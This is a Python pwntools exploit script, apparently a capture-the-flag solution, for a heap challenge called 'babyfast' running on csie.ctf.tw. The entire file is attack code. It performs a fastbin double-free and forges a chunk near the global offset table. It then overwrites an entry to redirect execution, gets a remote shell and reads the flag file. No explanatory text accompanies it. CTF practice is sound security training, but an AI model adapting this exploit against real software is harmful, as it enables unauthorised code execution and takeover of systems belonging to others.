#!/usr/bin/env python
from pwn import *

DEBUG = 0
if DEBUG:
    p = process('./babyfast-d4f44b92382b4bb11257ea06622644b26d2d06fe')
else:
    host = 'csie.ctf.tw'
    port  = 10142
    p = remote(host,port)

e = ELF('./babyfast-d4f44b92382b4bb11257ea06622644b26d2d06fe')
l = ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')

def allocate(size,data):
    p.recvuntil(':')
    p.sendline('1')
    p.recvuntil(':')
    p.send(str(size)+'\n')
    p.recvuntil(':')
    p.send(data+'\n')

def free(idx):
    p.recvuntil(':')
    p.sendline('2')
    p.recvuntil(':')
    p.send(str(idx)+'\n')

allocate(0x50,'mmmm')
allocate(0x50,'mmmm')
allocate(0x50,'mmmm')
free(0)
free(1)
free(0)
fake = 0x601ffa
allocate(0x50,p64(fake))    #0
allocate(0x50,'/bin/sh\x00')   #1
allocate(0x50,'aaaa')  #0
allocate(0x50,'a'*0xe + p64(0x4007d0))    #fake
free(1)
sleep(1)
p.send('cat /home/`whoami`/flag' + '\n')
p.interactive()
